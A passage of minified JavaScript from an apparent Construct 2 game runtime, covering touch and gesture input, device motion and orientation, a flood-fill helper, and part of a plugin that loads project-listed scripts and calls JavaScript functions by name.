n=cr.performance_now();this.time=n,this.lasttime=n,this.starttime=n,this.startx=t,this.starty=e,this.x=t,this.y=e,this.lastx=t,this.lasty=e,this.width=0,this.height=0,this.pressure=0,this.id=i,this.startindex=s,this.triggeredHold=!1,this.tooFarForHold=!1},c.prototype.update=function(t,e,i,s,n,r){this.lasttime=this.time,this.time=t,this.lastx=this.x,this.lasty=this.y,this.x=e,this.y=i,this.width=s,this.height=n,this.pressure=r,!this.tooFarForHold&&15<=cr.distanceTo(this.startx,this.starty,this.x,this.y)&&(this.tooFarForHold=!0)},c.prototype.maybeTriggerHold=function(t,e){this.triggeredHold||500<=cr.performance_now()-this.starttime&&!this.tooFarForHold&&cr.distanceTo(this.startx,this.starty,this.x,this.y)<15&&(this.triggeredHold=!0,t.trigger_index=this.startindex,t.trigger_id=this.id,t.getTouchIndex=e,t.runtime.trigger(cr.plugins_.Touch.prototype.cnds.OnHoldGesture,t),t.curTouchX=this.x,t.curTouchY=this.y,t.runtime.trigger(cr.plugins_.Touch.prototype.cnds.OnHoldGestureObject,t),t.getTouchIndex=0)};var u=-1e3,p=-1e3,d=-1e4;function g(t){return t.sourceCapabilities&&t.sourceCapabilities.firesTouchEvents||t.originalEvent&&t.originalEvent.sourceCapabilities&&t.originalEvent.sourceCapabilities.firesTouchEvents}function f(){}c.prototype.maybeTriggerTap=function(t,e){var i;this.triggeredHold||(i=cr.performance_now())-this.starttime<=333&&!this.tooFarForHold&&cr.distanceTo(this.startx,this.starty,this.x,this.y)<15&&(t.trigger_index=this.startindex,t.trigger_id=this.id,t.getTouchIndex=e,d=i-d<=666&&cr.distanceTo(u,p,this.x,this.y)<25?(t.runtime.trigger(cr.plugins_.Touch.prototype.cnds.OnDoubleTapGesture,t),t.curTouchX=this.x,t.curTouchY=this.y,t.runtime.trigger(cr.plugins_.Touch.prototype.cnds.OnDoubleTapGestureObject,t),p=u=-1e3,-1e4):(t.runtime.trigger(cr.plugins_.Touch.prototype.cnds.OnTapGesture,t),t.curTouchX=this.x,t.curTouchY=this.y,t.runtime.trigger(cr.plugins_.Touch.prototype.cnds.OnTapGestureObject,t),u=this.x,p=this.y,i),t.getTouchIndex=0)},e.onCreate=function(){this.isWindows8=!(void 0===window.c2isWindows8||!window.c2isWindows8),this.orient_alpha=0,this.orient_beta=0,this.orient_gamma=0,this.acc_g_x=0,this.acc_g_y=0,this.acc_g_z=0,this.acc_x=0,this.acc_y=0,this.acc_z=0,this.curTouchX=0,this.curTouchY=0,this.trigger_index=0,this.trigger_id=0,this.trigger_permission=0,this.getTouchIndex=0,this.useMouseInput=0!==this.properties[0];var t=0<this.runtime.fullscreen_mode?document:this.runtime.canvas,e=document;this.runtime.isDirectCanvas?e=t=window.Canvas:this.runtime.isCocoonJs&&(e=t=window);var i,s,n,r,o=this;"undefined"!=typeof PointerEvent?(t.addEventListener("pointerdown",function(t){o.onPointerStart(t)},!1),t.addEventListener("pointermove",function(t){o.onPointerMove(t)},!1),e.addEventListener("pointerup",function(t){o.onPointerEnd(t,!1)},!1),e.addEventListener("pointercancel",function(t){o.onPointerEnd(t,!0)},!1),this.runtime.canvas&&(this.runtime.canvas.addEventListener("MSGestureHold",function(t){t.preventDefault()},!1),document.addEventListener("MSGestureHold",function(t){t.preventDefault()},!1),this.runtime.canvas.addEventListener("gesturehold",function(t){t.preventDefault()},!1),document.addEventListener("gesturehold",function(t){t.preventDefault()},!1))):window.navigator.msPointerEnabled?(t.addEventListener("MSPointerDown",function(t){o.onPointerStart(t)},!1),t.addEventListener("MSPointerMove",function(t){o.onPointerMove(t)},!1),e.addEventListener("MSPointerUp",function(t){o.onPointerEnd(t,!1)},!1),e.addEventListener("MSPointerCancel",function(t){o.onPointerEnd(t,!0)},!1),this.runtime.canvas&&(this.runtime.canvas.addEventListener("MSGestureHold",function(t){t.preventDefault()},!1),document.addEventListener("MSGestureHold",function(t){t.preventDefault()},!1))):(t.addEventListener("touchstart",function(t){o.onTouchStart(t)},!1),t.addEventListener("touchmove",function(t){o.onTouchMove(t)},!1),e.addEventListener("touchend",function(t){o.onTouchEnd(t,!1)},!1),e.addEventListener("touchcancel",function(t){o.onTouchEnd(t,!0)},!1)),this.isWindows8?(i=function(t){t=t.reading;o.acc_x=t.accelerationX,o.acc_y=t.accelerationY,o.acc_z=t.accelerationZ},s=function(t){t=t.reading;o.orient_alpha=t.yawDegrees,o.orient_beta=t.pitchDegrees,o.orient_gamma=t.rollDegrees},(n=Windows.Devices.Sensors.Accelerometer.getDefault())&&(n.reportInterval=Math.max(n.minimumReportInterval,16),n.addEventListener("readingchanged",i)),(r=Windows.Devices.Sensors.Inclinometer.getDefault())&&(r.reportInterval=Math.max(r.minimumReportInterval,16),r.addEventListener("readingchanged",s)),document.addEventListener("visibilitychange",function(t){document.hidden||document.msHidden?(n&&n.removeEventListener("readingchanged",i),r&&r.removeEventListener("readingchanged",s)):(n&&n.addEventListener("readingchanged",i),r&&r.addEventListener("readingchanged",s))},!1)):(window.addEventListener("deviceorientation",function(t){o.orient_alpha=t.alpha||0,o.orient_beta=t.beta||0,o.orient_gamma=t.gamma||0},!1),window.addEventListener("devicemotion",function(t){t.accelerationIncludingGravity&&(o.acc_g_x=t.accelerationIncludingGravity.x||0,o.acc_g_y=t.accelerationIncludingGravity.y||0,o.acc_g_z=t.accelerationIncludingGravity.z||0),t.acceleration&&(o.acc_x=t.acceleration.x||0,o.acc_y=t.acceleration.y||0,o.acc_z=t.acceleration.z||0)},!1)),this.useMouseInput&&!this.runtime.isDomFree&&(jQuery(document).mousemove(function(t){o.onMouseMove(t)}),jQuery(document).mousedown(function(t){o.onMouseDown(t)}),jQuery(document).mouseup(function(t){o.onMouseUp(t)})),!this.runtime.isiOS&&this.runtime.isCordova&&navigator.accelerometer&&navigator.accelerometer.watchAcceleration&&navigator.accelerometer.watchAcceleration(a,null,{frequency:40}),this.runtime.tick2Me(this)},e.onPointerMove=function(t){var e,i,s;t.pointerType!==t.MSPOINTER_TYPE_MOUSE&&"mouse"!==t.pointerType&&(t.preventDefault&&t.preventDefault(),s=this.findTouch(t.pointerId),e=cr.performance_now(),0<=s&&(i=this.runtime.isDomFree?l:jQuery(this.runtime.canvas).offset(),e-(s=this.touches[s]).time<2||s.update(e,t.pageX-i.left,t.pageY-i.top,t.width||0,t.height||0,t.pressure||0)))},e.onPointerStart=function(t){var e,i;t.pointerType!==t.MSPOINTER_TYPE_MOUSE&&"mouse"!==t.pointerType&&(t.preventDefault&&cr.isCanvasInputEvent(t)&&t.preventDefault(),i=this.runtime.isDomFree?l:jQuery(this.runtime.canvas).offset(),e=t.pageX-i.left,i=t.pageY-i.top,cr.performance_now(),this.trigger_index=this.touches.length,this.trigger_id=t.pointerId,this.touches.push(h(e,i,t.pointerId,this.trigger_index)),this.runtime.isInUserInputEvent=!0,this.runtime.trigger(cr.plugins_.Touch.prototype.cnds.OnNthTouchStart,this),this.runtime.trigger(cr.plugins_.Touch.prototype.cnds.OnTouchStart,this),this.curTouchX=e,this.curTouchY=i,this.runtime.trigger(cr.plugins_.Touch.prototype.cnds.OnTouchObject,this),this.runtime.isInUserInputEvent=!1)},e.onPointerEnd=function(t,e){t.pointerType!==t.MSPOINTER_TYPE_MOUSE&&"mouse"!==t.pointerType&&(t.preventDefault&&cr.isCanvasInputEvent(t)&&t.preventDefault(),t=this.findTouch(t.pointerId),this.trigger_index=0<=t?this.touches[t].startindex:-1,this.trigger_id=0<=t?this.touches[t].id:-1,this.runtime.isInUserInputEvent=!0,this.runtime.trigger(cr.plugins_.Touch.prototype.cnds.OnNthTouchEnd,this),this.runtime.trigger(cr.plugins_.Touch.prototype.cnds.OnTouchEnd,this),0<=t&&(e||this.touches[t].maybeTriggerTap(this,t),o(this.touches[t]),this.touches.splice(t,1)),this.runtime.isInUserInputEvent=!1)},e.onTouchMove=function(t){t.preventDefault&&t.preventDefault();for(var e,i=cr.performance_now(),s=0,n=t.changedTouches.length;s<n;s++){e=t.changedTouches[s];var r,o,a,h,c=this.findTouch(e.identifier);0<=c&&(r=this.runtime.isDomFree?l:jQuery(this.runtime.canvas).offset(),i-(o=this.touches[c]).time<2||(a=2*(e.radiusX||e.webkitRadiusX||e.mozRadiusX||e.msRadiusX||0),h=2*(e.radiusY||e.webkitRadiusY||e.mozRadiusY||e.msRadiusY||0),c=e.force||e.webkitForce||e.mozForce||e.msForce||0,o.update(i,e.pageX-r.left,e.pageY-r.top,a,h,c)))}},e.onTouchStart=function(t){t.preventDefault&&cr.isCanvasInputEvent(t)&&t.preventDefault();var e,i,s=this.runtime.isDomFree?l:jQuery(this.runtime.canvas).offset();cr.performance_now();for(this.runtime.isInUserInputEvent=!0,e=0,i=t.changedTouches.length;e<i;e++){var n,r,o=t.changedTouches[e];-1===this.findTouch(o.identifier)&&(n=o.pageX-s.left,r=o.pageY-s.top,this.trigger_index=this.touches.length,this.trigger_id=o.identifier,this.touches.push(h(n,r,o.identifier,this.trigger_index)),this.runtime.trigger(cr.plugins_.Touch.prototype.cnds.OnNthTouchStart,this),this.runtime.trigger(cr.plugins_.Touch.prototype.cnds.OnTouchStart,this),this.curTouchX=n,this.curTouchY=r,this.runtime.trigger(cr.plugins_.Touch.prototype.cnds.OnTouchObject,this))}this.runtime.isInUserInputEvent=!1},e.onTouchEnd=function(t,e){var i,s,n;for(t.preventDefault&&cr.isCanvasInputEvent(t)&&t.preventDefault(),this.runtime.isInUserInputEvent=!0,i=0,s=t.changedTouches.length;i<s;i++)n=t.changedTouches[i],0<=(n=this.findTouch(n.identifier))&&(this.trigger_index=this.touches[n].startindex,this.trigger_id=this.touches[n].id,this.runtime.trigger(cr.plugins_.Touch.prototype.cnds.OnNthTouchEnd,this),this.runtime.trigger(cr.plugins_.Touch.prototype.cnds.OnTouchEnd,this),e||this.touches[n].maybeTriggerTap(this,n),o(this.touches[n]),this.touches.splice(n,1));this.runtime.isInUserInputEvent=!1},e.getAlpha=function(){return this.runtime.isCordova&&0===this.orient_alpha&&0!==n?90*n:this.orient_alpha},e.getBeta=function(){return this.runtime.isCordova&&0===this.orient_beta&&0!==s?90*s:this.orient_beta},e.getGamma=function(){return this.runtime.isCordova&&0===this.orient_gamma&&0!==i?90*i:this.orient_gamma},e.onMouseDown=function(t){g(t)||(t={changedTouches:[{pageX:t.pageX,pageY:t.pageY,identifier:0}]},this.onTouchStart(t),this.mouseDown=!0)},e.onMouseMove=function(t){this.mouseDown&&(g(t)||(t={changedTouches:[{pageX:t.pageX,pageY:t.pageY,identifier:0}]},this.onTouchMove(t)))},e.onMouseUp=function(t){t.preventDefault&&this.runtime.had_a_click&&!this.runtime.isMobile&&t.preventDefault(),this.runtime.had_a_click=!0,g(t)||(t={changedTouches:[{pageX:t.pageX,pageY:t.pageY,identifier:0}]},this.onTouchEnd(t),this.mouseDown=!1)},e.tick2=function(){for(var t,e=cr.performance_now(),i=0,s=this.touches.length;i<s;++i)(t=this.touches[i]).time<=e-50&&(t.lasttime=e),t.maybeTriggerHold(this,i)},f.prototype.OnTouchStart=function(){return!0},f.prototype.OnTouchEnd=function(){return!0},f.prototype.IsInTouch=function(){return this.touches.length},f.prototype.OnTouchObject=function(t){return!!t&&this.runtime.testAndSelectCanvasPointOverlap(t,this.curTouchX,this.curTouchY,!1)};var m=[];function y(){}function _(){}f.prototype.IsTouchingObject=function(t){if(!t)return!1;for(var e,i,s=t.getCurrentSol(),n=s.getObjects(),r=0,o=n.length;r<o;r++){var a=n[r];for(a.update_bbox(),e=0,i=this.touches.length;e<i;e++){var h=this.touches[e],c=a.layer.canvasToLayer(h.x,h.y,!0),h=a.layer.canvasToLayer(h.x,h.y,!1);if(a.contains_pt(c,h)){m.push(a);break}}}return!!m.length&&(s.select_all=!1,cr.shallowAssignArray(s.instances,m),t.applySolToContainer(),cr.clearArray(m),!0)},f.prototype.CompareTouchSpeed=function(t,e,i){if((t=Math.floor(t))<0||t>=this.touches.length)return!1;var s=this.touches[t],t=cr.distanceTo(s.x,s.y,s.lastx,s.lasty),s=(s.time-s.lasttime)/1e3,s=0<s?t/s:0;return cr.do_cmp(s,e,i)},f.prototype.OrientationSupported=function(){return void 0!==window.DeviceOrientationEvent},f.prototype.MotionSupported=function(){return void 0!==window.DeviceMotionEvent},f.prototype.CompareOrientation=function(t,e,i){var s=0,s=0===t?this.getAlpha():1===t?this.getBeta():this.getGamma();return cr.do_cmp(s,e,i)},f.prototype.CompareAcceleration=function(t,e,i){var s=0;return 0===t?s=this.acc_g_x:1===t?s=this.acc_g_y:2===t?s=this.acc_g_z:3===t?s=this.acc_x:4===t?s=this.acc_y:5===t&&(s=this.acc_z),cr.do_cmp(s,e,i)},f.prototype.OnNthTouchStart=function(t){return(t=Math.floor(t))===this.trigger_index},f.prototype.OnNthTouchEnd=function(t){return(t=Math.floor(t))===this.trigger_index},f.prototype.HasNthTouch=function(t){return t=Math.floor(t),this.touches.length>=t+1},f.prototype.OnHoldGesture=function(){return!0},f.prototype.OnTapGesture=function(){return!0},f.prototype.OnDoubleTapGesture=function(){return!0},f.prototype.OnHoldGestureObject=function(t){return!!t&&this.runtime.testAndSelectCanvasPointOverlap(t,this.curTouchX,this.curTouchY,!1)},f.prototype.OnTapGestureObject=function(t){return!!t&&this.runtime.testAndSelectCanvasPointOverlap(t,this.curTouchX,this.curTouchY,!1)},f.prototype.OnDoubleTapGestureObject=function(t){return!!t&&this.runtime.testAndSelectCanvasPointOverlap(t,this.curTouchX,this.curTouchY,!1)},f.prototype.OnPermissionGranted=function(t){return this.trigger_permission===t},f.prototype.OnPermissionDenied=function(t){return this.trigger_permission===t},t.cnds=new f,y.prototype.RequestPermission=function(e){var i=this,t=Promise.resolve(!0);0===e?window.DeviceOrientationEvent&&window.DeviceOrientationEvent.requestPermission&&(t=window.DeviceOrientationEvent.requestPermission().then(function(t){return"granted"===t})):window.DeviceMotionEvent&&window.DeviceMotionEvent.requestPermission&&(t=window.DeviceMotionEvent.requestPermission().then(function(t){return"granted"===t})),t.then(function(t){i.trigger_permission=e,t?i.runtime.trigger(cr.plugins_.Touch.prototype.cnds.OnPermissionGranted,i):i.runtime.trigger(cr.plugins_.Touch.prototype.cnds.OnPermissionDenied,i)})},t.acts=new y,_.prototype.TouchCount=function(t){t.set_int(this.touches.length)},_.prototype.X=function(t,e){var i,s,n,r,o,a=this.getTouchIndex;a<0||a>=this.touches.length?t.set_float(0):cr.is_undefined(e)?(s=(i=this.runtime.getLayerByNumber(0)).scale,n=i.zoomRate,r=i.parallaxX,o=i.angle,i.scale=1,i.zoomRate=1,i.parallaxX=1,i.angle=0,t.set_float(i.canvasToLayer(this.touches[a].x,this.touches[a].y,!0)),i.scale=s,i.zoomRate=n,i.parallaxX=r,i.angle=o):(i=cr.is_number(e)?this.runtime.getLayerByNumber(e):this.runtime.getLayerByName(e))?t.set_float(i.canvasToLayer(this.touches[a].x,this.touches[a].y,!0)):t.set_float(0)},_.prototype.XAt=function(t,e,i){var s,n,r,o,a;(e=Math.floor(e))<0||e>=this.touches.length?t.set_float(0):cr.is_undefined(i)?(n=(s=this.runtime.getLayerByNumber(0)).scale,r=s.zoomRate,o=s.parallaxX,a=s.angle,s.scale=1,s.zoomRate=1,s.parallaxX=1,s.angle=0,t.set_float(s.canvasToLayer(this.touches[e].x,this.touches[e].y,!0)),s.scale=n,s.zoomRate=r,s.parallaxX=o,s.angle=a):(s=cr.is_number(i)?this.runtime.getLayerByNumber(i):this.runtime.getLayerByName(i))?t.set_float(s.canvasToLayer(this.touches[e].x,this.touches[e].y,!0)):t.set_float(0)},_.prototype.XForID=function(t,e,i){var s,n,r,o,a=this.findTouch(e);a<0?t.set_float(0):(s=this.touches[a],cr.is_undefined(i)?(r=(n=this.runtime.getLayerByNumber(0)).scale,o=n.zoomRate,e=n.parallaxX,a=n.angle,n.scale=1,n.zoomRate=1,n.parallaxX=1,n.angle=0,t.set_float(n.canvasToLayer(s.x,s.y,!0)),n.scale=r,n.zoomRate=o,n.parallaxX=e,n.angle=a):(n=cr.is_number(i)?this.runtime.getLayerByNumber(i):this.runtime.getLayerByName(i))?t.set_float(n.canvasToLayer(s.x,s.y,!0)):t.set_float(0))},_.prototype.Y=function(t,e){var i,s,n,r,o,a=this.getTouchIndex;a<0||a>=this.touches.length?t.set_float(0):cr.is_undefined(e)?(s=(i=this.runtime.getLayerByNumber(0)).scale,n=i.zoomRate,r=i.parallaxY,o=i.angle,i.scale=1,i.zoomRate=1,i.parallaxY=1,i.angle=0,t.set_float(i.canvasToLayer(this.touches[a].x,this.touches[a].y,!1)),i.scale=s,i.zoomRate=n,i.parallaxY=r,i.angle=o):(i=cr.is_number(e)?this.runtime.getLayerByNumber(e):this.runtime.getLayerByName(e))?t.set_float(i.canvasToLayer(this.touches[a].x,this.touches[a].y,!1)):t.set_float(0)},_.prototype.YAt=function(t,e,i){var s,n,r,o,a;(e=Math.floor(e))<0||e>=this.touches.length?t.set_float(0):cr.is_undefined(i)?(n=(s=this.runtime.getLayerByNumber(0)).scale,r=s.zoomRate,o=s.parallaxY,a=s.angle,s.scale=1,s.zoomRate=1,s.parallaxY=1,s.angle=0,t.set_float(s.canvasToLayer(this.touches[e].x,this.touches[e].y,!1)),s.scale=n,s.zoomRate=r,s.parallaxY=o,s.angle=a):(s=cr.is_number(i)?this.runtime.getLayerByNumber(i):this.runtime.getLayerByName(i))?t.set_float(s.canvasToLayer(this.touches[e].x,this.touches[e].y,!1)):t.set_float(0)},_.prototype.YForID=function(t,e,i){var s,n,r,o,a=this.findTouch(e);a<0?t.set_float(0):(s=this.touches[a],cr.is_undefined(i)?(r=(n=this.runtime.getLayerByNumber(0)).scale,o=n.zoomRate,e=n.parallaxY,a=n.angle,n.scale=1,n.zoomRate=1,n.parallaxY=1,n.angle=0,t.set_float(n.canvasToLayer(s.x,s.y,!1)),n.scale=r,n.zoomRate=o,n.parallaxY=e,n.angle=a):(n=cr.is_number(i)?this.runtime.getLayerByNumber(i):this.runtime.getLayerByName(i))?t.set_float(n.canvasToLayer(s.x,s.y,!1)):t.set_float(0))},_.prototype.AbsoluteX=function(t){this.touches.length?t.set_float(this.touches[0].x):t.set_float(0)},_.prototype.AbsoluteXAt=function(t,e){(e=Math.floor(e))<0||e>=this.touches.length?t.set_float(0):t.set_float(this.touches[e].x)},_.prototype.AbsoluteXForID=function(t,e){e=this.findTouch(e);e<0?t.set_float(0):(e=this.touches[e],t.set_float(e.x))},_.prototype.AbsoluteY=function(t){this.touches.length?t.set_float(this.touches[0].y):t.set_float(0)},_.prototype.AbsoluteYAt=function(t,e){(e=Math.floor(e))<0||e>=this.touches.length?t.set_float(0):t.set_float(this.touches[e].y)},_.prototype.AbsoluteYForID=function(t,e){e=this.findTouch(e);e<0?t.set_float(0):(e=this.touches[e],t.set_float(e.y))},_.prototype.SpeedAt=function(t,e){var i;(e=Math.floor(e))<0||e>=this.touches.length?t.set_float(0):(i=this.touches[e],e=cr.distanceTo(i.x,i.y,i.lastx,i.lasty),(i=(i.time-i.lasttime)/1e3)<=0?t.set_float(0):t.set_float(e/i))},_.prototype.SpeedForID=function(t,e){var i=this.findTouch(e);i<0?t.set_float(0):(e=this.touches[i],i=cr.distanceTo(e.x,e.y,e.lastx,e.lasty),(e=(e.time-e.lasttime)/1e3)<=0?t.set_float(0):t.set_float(i/e))},_.prototype.AngleAt=function(t,e){(e=Math.floor(e))<0||e>=this.touches.length?t.set_float(0):(e=this.touches[e],t.set_float(cr.to_degrees(cr.angleTo(e.lastx,e.lasty,e.x,e.y))))},_.prototype.AngleForID=function(t,e){e=this.findTouch(e);e<0?t.set_float(0):(e=this.touches[e],t.set_float(cr.to_degrees(cr.angleTo(e.lastx,e.lasty,e.x,e.y))))},_.prototype.Alpha=function(t){t.set_float(this.getAlpha())},_.prototype.Beta=function(t){t.set_float(this.getBeta())},_.prototype.Gamma=function(t){t.set_float(this.getGamma())},_.prototype.AccelerationXWithG=function(t){t.set_float(this.acc_g_x)},_.prototype.AccelerationYWithG=function(t){t.set_float(this.acc_g_y)},_.prototype.AccelerationZWithG=function(t){t.set_float(this.acc_g_z)},_.prototype.AccelerationX=function(t){t.set_float(this.acc_x)},_.prototype.AccelerationY=function(t){t.set_float(this.acc_y)},_.prototype.AccelerationZ=function(t){t.set_float(this.acc_z)},_.prototype.TouchIndex=function(t){t.set_int(this.trigger_index)},_.prototype.TouchID=function(t){t.set_float(this.trigger_id)},_.prototype.WidthForID=function(t,e){e=this.findTouch(e);e<0?t.set_float(0):(e=this.touches[e],t.set_float(e.width))},_.prototype.HeightForID=function(t,e){e=this.findTouch(e);e<0?t.set_float(0):(e=this.touches[e],t.set_float(e.height))},_.prototype.PressureForID=function(t,e){e=this.findTouch(e);e<0?t.set_float(0):(e=this.touches[e],t.set_float(e.pressure))},t.exps=new _}(),void 0===window&&(window=void 0===window?"undefined"==typeof global?"undefined"==typeof self?this:self:global:window);var __CONSTRUCT2_RUNTIME2__=!0,__CONSTRUCT3_RUNTIME2__=!1,__CONSTRUCT3_RUNTIME3__=!1,__DEBUG__=!1;function flood_fill(e,t,i,s,n,r){if(!(s<0||t<s||n<0||i<n)){r=$("<div></div>").css("background-color",r).css("background-color");"transparent"==r&&(r="rgb(0,0,0)"),r=r.slice(4,-1).split(",");var o=4,a=r[0],h=r[1],c=r[2],l=e[f=(n*t+s)*o],u=e[f+1],p=e[f+2];if(a!=l||h!=u||c!=p)for(var d,g=[[s,n]];g.length;){var f,m=g.pop();for(s=m[0],n=m[1],f=(n*t+s)*o;0<=n--&&_(f);)f-=t*o;f+=t*o,++n;var y=[];for(y[-1]=!1,y[1]=!1;n++<i-1&&_(f);)e[d=f]=a,e[d+1]=h,e[d+2]=c,e[d+3]=255,0<s&&v(-1),s<t-1&&v(1),f+=t*o}}function _(t){return l==e[t]&&u==e[t+1]&&p==e[t+2]}function v(t){_(f+t*o)?y[t]||(g.push([s+t,n]),y[t]=!0):y[t]&&(y[t]=!1)}}cr.plugins_.ValerypopoffJSPlugin=function(t){this.runtime=t},function(){var pluginProto=cr.plugins_.ValerypopoffJSPlugin.prototype;pluginProto.Type=function(t){this.plugin=t,this.runtime=t.runtime};var typeProto=pluginProto.Type.prototype;typeProto.onCreate=function(){},pluginProto.Instance=function(t){this.type=t,this.runtime=t.runtime};var instanceProto=pluginProto.Instance.prototype;instanceProto.onCreate=function(){function e(t,e){var i;void 0!==document?((i=document.createElement("script")).setAttribute("type","text/javascript"),i.setAttribute("src",e),i.onreadystatechange=function(){"complete"==this.readyState&&t.sciptsToLoad--},i.onload=function(){t.sciptsToLoad--},i.onerror=function(){t.ShowError({debug_caller:"Including '"+e+"' script to the page",caller_name:"Including '"+e+"' script to the page",error_message:"Probably file not found"})},document.getElementsByTagName("head")[0].appendChild(i)):t.ShowError({debug_caller:"Including '"+e+"' script to the page",caller_name:"Including '"+e+"' script to the page",error_message:"'document' is not defined. You're probably launching the game in a Worker. Workers are not supported yet. Export project with 'Use worker' option unchecked in the 'Advanced' section of the 'Project properties' panel."})}if(this.returnValue=void 0,this.sciptsToLoad=0,this.Aliases={},this.construct_compare_function_prefix="ConstructCompare_",this.AliasDotpartsCache={count:0,max_count:4096,Dotparts:{},AliasNames:{},AliasTrailers:{},IsAlias:{}},this.NonAliasDotpartsCache={count:0,max_count:2048,Dotparts:{}},""!=this.properties[0])for(var i,s=[],s=__CONSTRUCT2_RUNTIME2__?this.properties[0].split(";"):this.properties[0].split(/[;\n\r]/),n=0;n<s.length;n++)s[n]=s[n].trim(),0!=s[n].length&&(this.sciptsToLoad++,__CONSTRUCT2_RUNTIME2__&&e(this,s[n]),__CONSTRUCT3_RUNTIME2__&&e(this,this.runtime.getLocalFileUrl(s[n])),__CONSTRUCT3_RUNTIME3__&&(void 0!==(i=this)._runtime.GetAssetManager().LoadProjectFileUrl?i._runtime.GetAssetManager().LoadProjectFileUrl(s[n]).then(function(t){e(i,t)},function(t){i.ShowError({debug_caller:"Including '"+s[n]+"' script to the page",caller_name:"Including '"+s[n]+"' script to the page",error_message:t.message})}).catch(function(t){i.ShowError({debug_caller:"Including '"+s[n]+"' script to the page",caller_name:"Including '"+s[n]+"' script to the page",error_message:t.message})}):e(i,i._runtime.GetAssetManager().GetLocalFileUrl(s[n]))))},instanceProto.draw=function(t){},instanceProto.drawGL=function(t){};var IsValidIdentifier=function(t){return/^[$A-Z_][0-9A-Z_$]*$/i.test(t)},DotStringToDotArray=function(n){for(var r=[],t=0,e=0,i=0,s=n.length;i<s;i++)"["!=n[i]?"]"!=n[i]?"."==n[i]&&t==e&&r.push(i):e++:t++;var o=[],a=r.length-1;return r.forEach(function(t,e,i){var s=r[e-1],s=n.substring(s+1,t);""!=s&&o.push(s),e==a&&""!=(s=n.substring(t+1))&&o.push(s)}),0==o.length&&o.push(n),o.forEach(function(t,e,i){"["==t[0]&&(i[e]=DotStringToDotArray(t.substring(1,t.length-1)))}),o},HashtagParamsToCode=function(t,e){return t=t.replace(/#[0-9]+/g,function(t){t=e[t.substr(1)];return"string"==typeof t?"'"+t+"'":t})},MakeCallString=function(t,e){var i=t+"(";if(e)for(var s=0,n=e.length;s<n;++s)"string"==typeof e[s]?i=i+"'"+e[s]+"'":i+=e[s],s!=e.length-1&&(i+=",");return i+=")"},InstanceFunctionsObject={Value:function(e,t){var i=t[0];t.splice(0,1);var s=this.ParseJS(i,!0,e);if(!s.error){var n=void 0;try{n=s.end}catch(t){var r={debug_caller:"Value",caller_name:e,"show-alias-expression":s.alias_found,alias_expression:s.trimmed_code,error_message:t.message};return this.ShowError(r),void ret.set_any(void 0)}return"function"==typeof s.end&&(n=this.CallJSfunction(i,t,!1,e,s)),n}ret.set_any(void 0)},CallJSfunction:function(e,i,t,s,n){var r;if(void 0===t&&(t=!0),void 0===s&&(s="'Call function' action"),!(r=void 0===n?this.ParseJS(e,!0,s):n).error){if(0<=e.indexOf("(")||0<=e.indexOf(")")){var o={debug_caller:"CallJSfunction",caller_name:s,error_message:"'"+r.trimmed_code+"' must be a function name, not a function call. Remove parentheses."};return r.alias_found&&(o["show-alias-expression"]=!0,o.alias_expression=r.trimmed_code),void this.ShowError(o)}var a=void 0;try{a=r.end.apply(r.context,i)}catch(t){t instanceof TypeError&&0<=t.message.indexOf("apply")&&0<=t.message.indexOf("undefined")&&(t.message=e+" is undefined");o={debug_caller:"CallJSfunction",caller_name:s,error_message:t.message};return r.alias_found?(o["show-alias-expression"]=!0,o.alias_expression=MakeCallString(r.trimmed_code,i),o["show-code"]=!0,o.code=MakeCallString(this.Aliases[r.alias_name].js+r.alias_trailer,i)):(o["show-code"]=!0,o.code=MakeCallString(r.trimmed_code,i)),void this.ShowError(o)}return t&&(this.returnValue=a),a}},CallAlias:function(t,e,i,s){void 0===i&&(i=!0),void 0===s&&(s="'Call alias' action");t=this.ParseJS(t,!0,s);if(!t.error)return this.CallJSfunction(this.Aliases[t.alias_name].js+t.alias_trailer,e,i,s,t)},ShowError:function(t){var e="ValerypopoffJS plugin: Error in "+t.caller_name+"\n";e+="--------------------- \n",__DEBUG__&&(e+="DEBUG CALLER: "+t.debug_caller+"\n",e+="--------------------- \n"),t["show-alias-expression"]&&(e+="Alias expression: "+t.alias_expression+"\n",e+="--------------------- \n"),t["show-code"]&&(e+="JS code: "+t.code+"\n",e+="--------------------- \n"),e+=t.error_message,console.error(e)},Resolve:function(t,e,i,s,n){for(var r=window,o=r,a="",h=0,c=t.length;h<c;h++){if("object"==typeof(a=t[h])){var l=this.Resolve(a,e,i,s,n);if(l.error)return{error:!0};a=l.end;try{o=o[a]}catch(t){var u={debug_caller:"Resolve",caller_name:e,error_message:t.message,"show-code":!0,code:i};return s&&(u["show-alias-expression"]=!0,u.code=this.Aliases[s].js+n,u.alias_expression=i),this.ShowError(u),{error:!0}}}else try{o=r!=window||IsValidIdentifier(a)?o[a]:("'"==a[0]&&(a=a.substring(1,a.length-1)),a)}catch(t){u={debug_caller:"Resolve",caller_name:e,error_message:t.message,"show-code":!0,code:i};return s&&(u["show-alias-expression"]=!0,u.code=this.Aliases[s].js+n,u.alias_expression=i),this.ShowError(u),{error:!0}}h<c-1&&(r=o)}return{error:!1,context:r,end:o,endname:a}},ParseJS:function(t,e,i){var s=!1,n=void 0,r=void 0,o=[],a=void 0,t=t.trim().replace(/\s*([\.\[\]])\s*/g,"$1");if((a=this.AliasDotpartsCache).Dotparts[t])o=a.Dotparts[t],a.IsAlias[t]&&(s=!0,n=a.AliasNames[t],r=a.AliasTrailers[t]);else{if(n=t.split(/[\.\[]/)[0],r=t.substring(n.length),o=this.Aliases[n]?(s=!0,DotStringToDotArray(r?this.Aliases[n].dotstring+r.split("[").join(".["):this.Aliases[n].dotstring)):(r=n=void 0,DotStringToDotArray(t.split("[").join(".["))),a.count>=a.max_count)for(var h in a.Dotparts)if(delete a.Dotparts[h],a.IsAlias[h]&&(delete a.AliasNames[h],delete a.AliasTrailers[h],delete a.IsAlias[h]),a.count--,a.count<=a.max_count)break;a.Dotparts[t]=o,s&&(a.AliasNames[t]=n,a.AliasTrailers[t]=r,a.IsAlias[t]=!0),a.count++}i=this.Resolve(o,i,t,n,r);return{error:i.error,end:i.end,endname:i.endname,context:i.context,trimmed_code:t,alias_found:s,alias_name:n,alias_trailer:r}}},k;for(k in InstanceFunctionsObject)instanceProto[k]=InstanceFunctionsObject[k];function Cnds(){}var CndsObject={C2CompareFunctionReturnValue:function(t,e,i,s){switch(e){case 2:e=4;break;case 3:e=5;break;case 4:e=2;break;case 5:e=3}return this.CNDS.CompareFunctionReturnValue.call(this,i,s,e,t)},C2CompareAliasCallReturnValue:function(t,e,i,s){switch(e){case 2:e=4;break;case 3:e=5;break;case 4:e=2;break;case 5:e=3}return 